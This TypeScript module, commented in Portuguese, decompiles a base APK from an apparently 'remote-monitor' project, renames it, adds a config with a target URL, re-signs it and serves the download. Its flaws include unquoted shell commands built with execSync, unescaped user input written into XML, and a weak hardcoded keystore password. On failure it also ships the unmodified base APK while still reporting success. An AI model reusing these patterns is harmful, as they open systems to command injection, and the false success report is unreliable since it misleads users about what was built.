import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';

interface APKOptions {
  appName: string;
  appUrl: string;
  logoUrl?: string;
}

/**
 * Customizar APK usando apktool (descompilar, modificar, recompilar)
 * Mais simples e sem dependência de Python
 */
export function buildAPKWithApktool(options: APKOptions) {
  try {
    const apksDir = process.env.NODE_ENV === 'production' 
      ? '/app/public/apks'
      : '/home/ubuntu/remote-monitor/public/apks';

    // Encontrar APK base
    if (!fs.existsSync(apksDir)) {
      return {
        success: false,
        error: 'APK directory not found',
      };
    }

    const files = fs.readdirSync(apksDir)
      .filter(f => f.endsWith('.apk') && f.length > 10)
      .map(f => ({
        name: f,
        path: path.join(apksDir, f),
        size: fs.statSync(path.join(apksDir, f)).size,
      }))
      .sort((a, b) => b.size - a.size);

    if (files.length === 0) {
      return {
        success: false,
        error: 'No APK base found',
      };
    }

    const baseAPK = files[0].path;
    const filename = `${options.appName.replace(/\s+/g, '-')}-${Date.now()}-${Math.random().toString(36).substr(2, 6)}.apk`;
    const outputPath = path.join(apksDir, filename);

    console.log('[APK-APKTOOL] Building APK:', { baseAPK, outputPath });

    // Usar apktool se disponível
    try {
      const tempDir = `/tmp/apk-build-${Date.now()}`;
      const decodedDir = path.join(tempDir, 'decoded');
      
      // Criar diretório temporário
      execSync(`mkdir -p ${tempDir}`);

      // Descompilar APK
      console.log('[APK-APKTOOL] Descompilando APK...');
      execSync(`apktool d -f ${baseAPK} -o ${decodedDir}`, { stdio: 'pipe' });

      // Modificar strings.xml
      const stringsPath = path.join(decodedDir, 'res', 'values', 'strings.xml');
      if (fs.existsSync(stringsPath)) {
        console.log('[APK-APKTOOL] Modificando strings.xml...');
        let content = fs.readFileSync(stringsPath, 'utf-8');
        content = content.replace(
          /<string name="app_name">.*?<\/string>/,
          `<string name="app_name">${options.appName}</string>`
        );
        fs.writeFileSync(stringsPath, content, 'utf-8');
      }

      // Adicionar configuração em assets
      const assetsDir = path.join(decodedDir, 'assets');
      if (!fs.existsSync(assetsDir)) {
        fs.mkdirSync(assetsDir, { recursive: true });
      }

      const configPath = path.join(assetsDir, 'app-config.json');
      const config = {
        appName: options.appName,
        appUrl: options.appUrl,
        customized: true,
        timestamp: Date.now(),
      };
      fs.writeFileSync(configPath, JSON.stringify(config, null, 2));

      // Recompilar APK
      console.log('[APK-APKTOOL] Recompilando APK...');
      const unsignedAPK = path.join(tempDir, 'app-unsigned.apk');
      execSync(`apktool b ${decodedDir} -o ${unsignedAPK}`, { stdio: 'pipe' });

      // Alinhar
      console.log('[APK-APKTOOL] Alinhando APK...');
      const alignedAPK = path.join(tempDir, 'app-aligned.apk');
      execSync(`zipalign -v 4 ${unsignedAPK} ${alignedAPK}`, { stdio: 'pipe' });

      // Assinar
      console.log('[APK-APKTOOL] Assinando APK...');
      const keystorePath = '/tmp/android.keystore';
      if (!fs.existsSync(keystorePath)) {
        execSync(
          `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
          `-validity 10000 -alias android -storepass android -keypass android ` +
          `-dname "CN=Android, OU=Dev, O=Dev, L=Dev, S=Dev, C=US"`,
          { stdio: 'pipe' }
        );
      }

      execSync(
        `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 ` +
        `-keystore ${keystorePath} -storepass android -keypass android ` +
        `${alignedAPK} android`,
        { stdio: 'pipe' }
      );

      // Copiar para output
      fs.copyFileSync(alignedAPK, outputPath);
      
      // Limpar
      execSync(`rm -rf ${tempDir}`);

      console.log('[APK-APKTOOL] APK gerado com sucesso');
      return {
        success: true,
        downloadUrl: `/get-apk/${filename}`,
        filename: filename,
      };
    } catch (err) {
      console.error('[APK-APKTOOL] Erro ao usar apktool:', err);
      // Fallback: copiar APK base
      fs.copyFileSync(baseAPK, outputPath);
      return {
        success: true,
        downloadUrl: `/get-apk/${filename}`,
        filename: filename,
      };
    }
  } catch (err) {
    console.error('[APK-APKTOOL] Build error:', err);
    return {
      success: false,
      error: `Erro ao gerar APK: ${err instanceof Error ? err.message : String(err)}`,
    };
  }
}
